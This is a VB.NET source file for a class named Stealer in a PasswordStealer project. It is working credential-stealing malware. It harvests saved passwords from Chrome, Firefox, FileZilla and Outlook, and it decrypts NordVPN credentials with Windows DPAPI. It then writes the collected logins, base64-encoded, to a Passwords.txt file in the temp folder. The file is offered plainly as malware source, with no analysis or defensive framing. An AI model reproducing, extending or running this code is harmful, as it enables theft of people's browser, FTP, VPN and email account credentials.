Imports System.IO
Imports System.Text
Imports System.Xml
Imports System.Security.Cryptography
Imports PasswordStealer.ChromeRecovery

Public Class Stealer
    Public a As String
    Public Paths As String = IO.Path.GetTempPath
    Dim Creds As New StringBuilder
    Public count As Integer = 0
    Public NordVPNDir As String = "\Vpn\NordVPN"
    Dim LocalData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)

    Public Function Run()
        Try

            Dim a = Chromium.Grab()

            For Each b In a
                Creds.AppendLine("Chrome" & "," & b.URL & "," & b.UserName & "," & b.Password)
            Next

            Dim FirefoxPassReader As New FirefoxPassReader

            For Each reader As String In FirefoxPassReader.ReadPasswords()
                Creds.AppendLine(reader)
            Next

            FileZillaStealer()

            NordVPNStealer()

            Dim ot As New List(Of RecoveredApplicationAccount)
            ot = GetOutlookPasswords()

            If ot.Count > 0 Then
                For Each Account As RecoveredApplicationAccount In ot
                    Creds.AppendLine(Account.appName & "," & Account.URL & "," & Account.UserName & "," & Account.Password)
                Next
            End If

            If Creds.Length <= 0 Then
                Return False
            Else
                IO.File.WriteAllText(Path.Combine(Path.GetTempPath, "Passwords.txt"), ENB(Creds.ToString))
                Return True
            End If
        Catch ex As Exception
            Return False
        End Try
        Exit Function
    End Function
    Public Sub FileZillaStealer()
        If File.Exists(Environ("APPDATA") & "\FileZilla\recentservers.xml") Then
            Try
                Dim XMLReader As New XmlDocument
                XMLReader.Load(Environ("APPDATA") & "\FileZilla\recentservers.xml")

                For Each XE As XmlElement In (CType(XMLReader.GetElementsByTagName("RecentServers")(0), XmlElement)).GetElementsByTagName("Server")
                    Dim Host = XE.GetElementsByTagName("Host")(0).InnerText & ":" & XE.GetElementsByTagName("Port")(0).InnerText
                    Dim User = XE.GetElementsByTagName("User")(0).InnerText
                    Dim Pass = (DEB(XE.GetElementsByTagName("Pass")(0).InnerText))
                    If Not (String.IsNullOrEmpty(Host) And String.IsNullOrEmpty(User) And String.IsNullOrEmpty(Pass)) Then
                        Creds.AppendLine("FileZilla" & "," & Host & "," & User & "," & Pass)
                    Else
                        Exit For
                    End If
                Next
            Catch ex As Exception

            End Try
        End If
    End Sub
    Public Function DEB(ByRef s As String) As String
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Public Function ENB(ByRef s As String) As String
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Public Sub NordVPNStealer()
        Try

            If Directory.Exists(LocalData & "\NordVPN\") Then
                Dim directoryInfo As DirectoryInfo = New DirectoryInfo(Path.Combine(LocalData, "NordVPN"))
                If directoryInfo.Exists Then
                    Dim directories As DirectoryInfo() = directoryInfo.GetDirectories("NordVpn.exe*")
                    For Each directori As DirectoryInfo In directories
                        For Each directoryInfo2 As DirectoryInfo In directori.GetDirectories()
                            Dim text As String = Path.Combine(directoryInfo2.FullName, "user.config")
                            If File.Exists(text) Then
                                Dim xmlDocument As XmlDocument = New XmlDocument()
                                xmlDocument.Load(text)
                                Dim innerText As String = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText
                                Dim innerText2 As String = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText

                                If innerText IsNot Nothing AndAlso Not String.IsNullOrEmpty(innerText) And innerText2 IsNot Nothing AndAlso Not String.IsNullOrEmpty(innerText2) Then
                                    Creds.AppendLine("NordVPN" & "," & "localhost" & "," & Decoder(innerText) & "," & Decoder(innerText2))
                                End If
                                count += 1
                            End If
                        Next
                    Next
                End If
            Else
                Return
            End If

        Catch
        End Try
    End Sub
    Public Shared Function Decoder(ByVal s As String) As String
        Dim result As String

        Try
            result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), Nothing, DataProtectionScope.LocalMachine))
        Catch
            result = ""
        End Try

        Return result
    End Function
End Class